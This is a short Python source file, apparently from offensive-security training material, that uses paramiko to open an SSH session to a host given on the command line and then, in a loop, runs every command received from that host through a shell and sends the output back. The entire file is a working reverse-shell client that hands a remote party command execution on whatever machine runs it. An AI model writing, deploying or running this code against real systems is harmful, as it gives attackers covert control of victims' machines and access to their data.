import paramiko
import sys
import argparse
import threading
import subprocess


def parse_args(args):
    a = argparse.ArgumentParser()
    a.add_argument('host', help='host to connect to')
    a.add_argument('port', help='port to connect to', type=int)
    a.add_argument('username', help='Username to use')
    a.add_argument('password', help='Password to use')
    return a.parse_args(args)


def ssh_command(ip, port, user, passwd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, passphrase=passwd, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        print(ssh_session.recv(1024).decode('utf-8'))
        try:
            while True:
                command = ssh_session.recv(1024)
                try:
                    cmd_input = command.decode('utf-8')
                    print('[<] Received input "{}"'.format(cmd_input))
                    cmd_output = subprocess.check_output(cmd_input, shell=True)
                    print('[>] Sending output "{}"'.format(cmd_output.decode('utf-8').strip()))
                    ssh_session.send(cmd_output)
                except Exception as e:
                    ssh_session.send(str(e).encode())
        except KeyboardInterrupt as e:
            print("[!!] Caught keyboard interrupt, exiting")
        client.close()
    return


if __name__ == '__main__':
    args = parse_args(sys.argv[1:])
    ssh_command(args.host, args.port, args.username, args.password)
